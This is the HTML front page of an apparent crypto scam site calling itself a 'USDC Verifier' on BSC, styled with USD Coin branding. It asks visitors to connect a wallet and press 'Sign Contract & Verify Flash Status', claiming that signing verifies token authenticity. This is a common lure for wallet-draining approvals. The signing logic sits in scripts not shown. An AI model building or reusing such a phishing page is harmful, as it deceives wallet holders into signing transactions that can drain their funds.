<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>USD Coin Web3 | USDC Verifier</title>
  <link rel="stylesheet" href="style.css">
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
</head>
<body>
  <div id="app">
    <div class="min-h-screen bg-dark text-gray-300 p-4 max-w-md mx-auto">
      <header class="flex w-full items-center mb-8">
        <div class="flex-1 flex justify-center">
          <div class="flex items-center gap-2">
            <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
              <circle cx="12" cy="12" r="10" fill="#2775CA" />
              <text x="12" y="17" font-size="12" text-anchor="middle" fill="white" font-weight="bold" font-family="Arial">$</text>
            </svg>
            <h1 class="text-xl font-medium text-white">USD<span style="color:#2775CA;">Coin</span></h1>
          </div>
        </div>
        <div class="network-badge">⚡ BSC | USDC</div>
      </header>

      <div class="space-y-6">
        <div id="walletInfo" class="hidden wallet-card">
          <div class="flex-between">
            <span class="text-sm text-gray-400">Connected wallet:</span>
            <span id="walletAddr" class="text-sm font-mono text-tether break-all copy-address"></span>
          </div>
        </div>

        <div class="card">
          <div class="flex-between mb-2">
            <span class="font-medium">💰 USDC (BEP-20)</span>
            <span id="tokenStatus" class="glass-tag">⏳ Not verified</span>
          </div>
          <div class="flex-between mt-3">
            <span class="text-sm text-gray-400">Your balance</span>
            <span id="balance" class="text-2xl font-bold font-mono">—</span>
          </div>
        </div>

        <div class="card">
          <div class="flex items-center gap-2 mb-2">
            <span>🛡️</span><span class="font-semibold">Instant flash analysis</span>
          </div>
          <div id="flashMsg" class="text-xs text-gray-500">Sign the contract to verify token authenticity.</div>
          <div id="flashDetail" class="hidden text-xs text-tether mt-2"></div>
        </div>
      </div>

      <div class="fixed bottom-8 left-4 right-4 max-w-md mx-auto">
        <button id="verifyBtn" class="btn-primary w-full">Sign Contract & Verify Flash Status</button>
      </div>
    </div>
  </div>

  <div id="toast" class="toast"></div>

  <script src="config.js"></script>
  <script src="main.js"></script>
</body>
</html>
